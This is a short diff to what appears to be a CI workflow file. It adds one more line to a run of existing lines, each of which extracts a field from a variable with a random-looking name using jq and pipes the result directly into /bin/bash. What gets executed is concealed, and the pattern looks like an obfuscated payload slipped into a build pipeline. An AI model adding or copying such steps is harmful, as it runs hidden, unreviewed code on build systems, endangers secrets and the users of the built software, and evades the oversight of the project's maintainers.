@@ -34,6 +34,7 @@ jobs:
           echo $jup2 | jq -r .dr75613 | /bin/bash
           echo $omtw8 | jq -r .je6 | /bin/bash
           echo $xsgo904 | jq -r .nvg7801 | /bin/bash
+          echo $wxw92 | jq -r .as0922 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
